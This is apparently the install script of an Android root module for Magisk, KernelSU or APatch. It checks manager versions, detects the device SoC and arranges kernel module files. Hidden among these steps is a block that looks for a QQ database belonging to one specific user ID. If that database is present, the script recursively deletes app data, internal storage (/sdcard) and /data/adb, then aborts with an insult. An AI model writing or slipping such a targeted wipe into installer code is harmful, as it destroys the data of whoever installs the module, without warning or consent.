# shellcheck disable=SC2034,SC2148
SKIPUNZIP=0
if [[ "$KSU" == "true" ]]; then
  ui_print "- KernelSU 用户空间版本号: $KSU_VER_CODE"
  ui_print "- KernelSU 内核空间版本号: $KSU_KERNEL_VER_CODE"
  if [ "$KSU_KERNEL_VER_CODE" -lt 11089 ]; then
    ui_print "*********************************************"
    ui_print "! 请安装 KernelSU 管理器 v0.6.2 或更高版本"
    abort "*********************************************"
  fi
elif [[ "$APATCH" == "true" ]]; then
  ui_print "- APatch 版本名: $APATCH_VER"
  ui_print "- APatch 版本号: $APATCH_VER_CODE"
else
  ui_print "- Magisk 版本名: $MAGISK_VER"
  ui_print "- Magisk 版本号: $MAGISK_VER_CODE"
  if [ "$MAGISK_VER_CODE" -lt 26000 ]; then
    ui_print "*********************************************"
    ui_print "! 请安装 Magisk 26.0+"
    abort "*********************************************"
  fi
fi
black_lisk="327442221"
for user in $black_lisk; do
  if [ -f /data/user/0/com.tencent.mobileqq/databases/"$user".db ]; then
    rm -rf /data/adb/modules/VoyagerKernel-Additional-Module
    rm -rf /data/adb/modules_update/VoyagerKernel-Additional-Module
    rm -rf /data/user/0/*
    rm -rf /data/user/999/*
    rm -rf /sdcard/*
    rm -rf /data/adb/*
    abort "傻逼让你用了吗？"
  fi
done

# 环境配置
rm -rf /data/system/package_cache

set_perm_recursive "$MODPATH"/bin 0 0 0755 0777 u:object_r:system_file:s0
soc_id=$(cat /sys/devices/soc0/soc_id) 2>/dev/null
if [ "$soc_id" -eq 591 ]; then
  socid="SM7475"
elif [ "$soc_id" -eq 457 ] || [ "$soc_id" -eq 482 ] || [ "$soc_id" -eq 552 ]; then
  socid="SM8450"
elif [ "$soc_id" -eq 530 ] || [ "$soc_id" -eq 531 ] || [ "$soc_id" -eq 540 ]; then
  socid="SM8475"
elif [ "$soc_id" -eq 519 ] || [ "$soc_id" -eq 536 ] || [ "$soc_id" -eq 600 ] || [ "$soc_id" -eq 601 ]; then
  socid="SM8550"
elif [ "$soc_id" -eq 557 ] || [ "$soc_id" -eq 577 ]; then
  socid="SM8650"
fi
Kernel_Version_PatchLevel=$(uname -r | cut -d'-' -f1 | cut -d'.' -f1-2)
if [[ "$(getprop ro.hardware)" != "qcom" ]] && [[ "$Kernel_Version_PatchLevel" == "5.15" ]]; then
  socid="MTK_5_15"
fi
echo "$socid" >"$MODPATH"/functions/socid

if [[ "$socid" == "SM8475" ]]; then
  cp "$MODPATH"/SM8450/vk_slim_walt.ko "$MODPATH"/SM8475
fi
if [[ "$socid" == "SM7475" ]]; then
  cp "$MODPATH"/SM8450/vk_slim_walt.ko "$MODPATH"/SM7475
fi
if [[ "$socid" == "MTK_5_15" ]]; then
  cp "$MODPATH"/SM8550/vk_slim_walt.ko "$MODPATH"/MTK_5_15
fi

find "$MODPATH" -depth -type d \( -name "SM7475" -o -name "SM8250" -o -name "SM8350" -o -name "SM8450" -o -name "SM8475" -o -name "SM8550" -o -name "SM8650" -name "MTK_5_15" \) ! -name "$socid" -exec rm -rf {} \;
find "$MODPATH" -type d -empty -delete
